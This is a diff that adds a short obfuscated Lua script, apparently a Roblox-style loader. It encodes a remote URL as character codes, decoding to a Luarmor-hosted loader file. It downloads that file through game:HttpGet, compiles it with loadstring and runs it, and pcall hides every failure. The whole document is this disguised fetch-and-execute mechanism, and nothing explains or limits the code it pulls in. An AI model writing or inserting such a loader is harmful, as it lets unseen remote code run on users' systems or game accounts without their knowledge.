@@ -1,0 +1,37 @@
+local a=string.char
+local b=table.concat
+
+local c={
+  104,116,116,112,115,58,47,47,
+  97,112,105,46,108,117,97,114,
+  109,111,114,46,110,101,116,47,
+  102,105,108,101,115,47,118,52,
+  47,108,111,97,100,101,114,115,47,
+  49,100,53,101,99,97,98,97,49,
+  48,53,56,49,51,102,99,57,101,
+  49,53,52,98,56,49,101,97,50,
+  55,50,48,101,50,46,108,117,97
+}
+
+local d={}
+for i=1,#c do
+    d[i]=a(c[i])
+end
+
+local e=b(d)
+local f=game
+local g=f.HttpGet
+local h=loadstring
+
+local i,j=pcall(g,f,e)
+if not i or type(j)~="string" then
+    return
+end
+
+local k,l=pcall(h,j)
+if not k or type(l)~="function" then
+    return
+end
+
+pcall(l)
+
